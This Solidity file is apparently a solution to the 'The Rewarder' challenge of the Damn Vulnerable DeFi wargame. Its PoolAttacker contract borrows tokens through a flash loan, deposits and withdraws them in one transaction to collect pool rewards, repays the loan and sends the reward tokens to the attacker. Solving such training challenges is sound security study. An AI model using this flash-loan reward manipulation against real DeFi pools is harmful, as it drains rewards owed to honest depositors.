// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

contract PoolAttacker {
    address private attacker;
    TheRewarderPool private target;
    DamnValuableToken private liquidityToken;
    FlashLoanerPool private fashLoanerPool;
    RewardToken private rewardToken;

    constructor(address _target, address liquidityTokenAddress, address flashLoanerPoolAddress, address rewardTokenAddress) {
        attacker = msg.sender;
        target = TheRewarderPool(_target);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        fashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        rewardToken = RewardToken(rewardTokenAddress);
    }

    function attack(uint256 amount) external {
        fashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(target), amount);
        target.deposit(amount);
        target.withdraw(amount);
        liquidityToken.transfer(address(fashLoanerPool), amount);
    }

    function takeAll() external {
        uint256 balance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(attacker, balance);
    }
}